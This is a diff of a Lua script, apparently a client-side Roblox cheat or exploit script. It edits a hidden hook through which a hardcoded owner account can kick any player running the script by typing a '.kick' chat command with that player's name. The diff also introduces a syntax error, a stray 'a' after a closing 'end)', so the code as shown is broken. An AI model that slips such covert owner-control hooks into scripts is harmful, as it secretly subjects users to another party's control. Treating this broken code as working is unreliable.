@@ -729,8 +729,11 @@ local OWNER = "jvpogi233j"
 local function watchOwnerChat(p)
     if p.Name ~= OWNER then return end
     p.Chatted:Connect(function(msg)
-        if msg:lower():sub(1, 5) ~= ".kick" then return end
-        local reason = msg:sub(6):match("^%s*(.-)%s*$") or ""
+        if msg:lower():sub(1, 6) ~= ".kick " then return end
+        local body = msg:sub(7)
+        local user, reason = body:match("^(%S+)%s*(.-)%s*$")
+        if not user then return end
+        if not lp.Name:lower():find(user:lower(), 1, true) then return end
         lp:Kick(reason ~= "" and reason or "Kicked.")
     end)
 end
@@ -741,7 +744,7 @@ end
 
 Players.PlayerAdded:Connect(function(p)
     watchOwnerChat(p)
-end)
+end)a
 
 -- ── FakeHRP sync: Heartbeat (positional, must remain per-frame) ───────────────
 RunService.Heartbeat:Connect(function()
